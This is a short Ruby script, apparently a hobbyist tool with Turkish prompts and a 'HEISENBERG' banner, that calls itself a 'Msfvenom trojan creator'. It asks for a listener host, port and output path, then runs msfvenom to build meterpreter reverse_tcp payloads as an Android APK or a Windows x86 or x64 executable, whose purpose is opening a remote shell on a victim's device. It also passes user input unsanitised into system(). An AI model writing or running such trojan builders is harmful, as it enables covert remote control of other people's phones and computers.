require "colorize"

puts"
██╗  ██╗███████╗██╗███████╗███████╗███╗   ██╗██████╗ ███████╗██████╗  ██████╗ 
██║  ██║██╔════╝██║██╔════╝██╔════╝████╗  ██║██╔══██╗██╔════╝██╔══██╗██╔════╝ 
███████║█████╗  ██║███████╗█████╗  ██╔██╗ ██║██████╔╝█████╗  ██████╔╝██║  ███╗
██╔══██║██╔══╝  ██║╚════██║██╔══╝  ██║╚██╗██║██╔══██╗██╔══╝  ██╔══██╗██║   ██║
██║  ██║███████╗██║███████║███████╗██║ ╚████║██████╔╝███████╗██║  ██║╚██████╔╝
╚═╝  ╚═╝╚══════╝╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ 
BY : QUEY7Z         //        Msfvenom trojan creator   //  TERMUX OR LİNUX
================================================================================"

puts"
1) APK
2) WİNDOWS X86
3) WİNDOWS X64
".blue

print"İşlem : ".green
islem = gets.chop().to_i

if islem == 1
    print "LHOST : ".green
    lhost=gets.chop

    print "LPORT : ".green
    lport = gets.chop

    print "Kaydedilecek dizin : ".green
    dizin = gets.chop

    system("msfvenom -p android/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} R > #{dizin}")

elsif islem == 2
    print "LHOST : ".green
    lhost=gets.chop

    print "LPORT : ".green
    lport = gets.chop

    print "Kaydedilecek dizin : ".green
    dizin = gets.chop

    system("msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} -f exe -o #{dizin}")
    
elsif islem == 3
    print "LHOST : ".green
    lhost=gets.chop

    print "LPORT : ".green
    lport = gets.chop

    print "Kaydedilecek dizin : ".green
    dizin = gets.chop

    system("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} -f exe -o #{dizin}")
end
